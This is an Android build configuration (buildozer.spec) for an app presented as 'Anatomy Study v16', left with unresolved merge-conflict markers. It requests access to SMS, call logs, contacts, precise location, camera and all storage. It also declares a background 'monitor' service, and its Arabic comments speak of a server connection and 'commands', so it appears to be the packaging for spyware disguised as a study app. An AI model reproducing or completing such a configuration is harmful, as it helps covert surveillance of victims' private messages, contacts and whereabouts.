[app]

# (str) Title of your application
title = Anatomy Study v16

# (str) Package name
package.name = edu.anatomy.learning

# (str) Package domain (needed for android packaging)
package.domain = org.edu.health

# (str) Source code where the main.py live
source.dir = .

<<<<<<< HEAD
#requirements = python3,kivy,requests,certifi,urllib3,pyjnius
#requirements = python3,kivy,requests,certifi,urllib3,pyjnius,cryptography,pyopenss
requirements = python3,kivy==2.2.1,requests,certifi,urllib3,pyjnius,openssl,cryptography
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_CALL_LOG, READ_CONTACTS, MANAGE_EXTERNAL_STORAGE, FOREGROUND_SERVICE

android.api = 33
android.arch = arm64-v8a
# السطر التالي مهم جداً لتشغيل الكود كخدمة مستقلة
android.services = monitor:core_logic.py

[buildozer]
log_level = 2
=======
# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (list) Application requirements
# أضفنا كل المكتبات اللازمة للاتصال والسيرفر
requirements = python3,kivy,requests,certifi,urllib3,pyjnius,android

# (str) Custom source folders for requirements
# (list) Permissions
# هذه هي الأذونات الشاملة لكل الأوامر التي طلبتِها
android.permissions = INTERNET, READ_CONTACTS, READ_SMS, READ_CALL_LOG, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, WAKE_LOCK

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (list) The Android architectures to build for
android.archs = arm64-v8a

# (bool) use_wayland: If true, Wayland will be used for windowing.
# (str) Android entry point, default is ok for Kivy-based app
# (str) Full name including package path of the Java class that implements Android Activity
# android.entrypoint = org.kivy.android.PythonActivity

# (bool) If True, then skip trying to update the libs of the project.
# android.skip_update = False

# (bool) If True, then the app will be logged on every start up.
# android.logcat = True

# (str) Android logcat filters to use
# android.logcat_filters = *:S python:D

# (str) The orientation of the app
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 1

# (list) List of service to declare
# لجعل المحرك يعمل كخدمة في الخلفية (اختياري حالياً)
# android.services = monitor:service.py

# (bool) If True, the screen will never go to sleep
android.wakelock = True

# (str) Path to a custom whitelist file
# android.whitelist =

# (str) Path to a custom blacklist file
# android.blacklist =

# (list) List of Java .jar files to add to the libs so that pyjnius can access their classes.
# android.add_jars = foo.jar,bar.jar,baz.jar:another.jar

# (list) List of Java files to add to the project (can be java or a directory containing java files)
# android.add_src =

# (list) Android AAR archives to add
# android.add_aars =

# (list) Gradle dependencies
# android.gradle_dependencies =

# (list) add files in assets folder
# android.add_assets =

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1

# (str) Path to build artifacts (default is <source.dir>/.buildozer)
# build_dir = ./.buildozer

# (str) Path to bin directory (default is <source.dir>/bin)
# bin_dir = ./bin
>>>>>>> 83c9ca9 (Update core logic and build workflow v16)
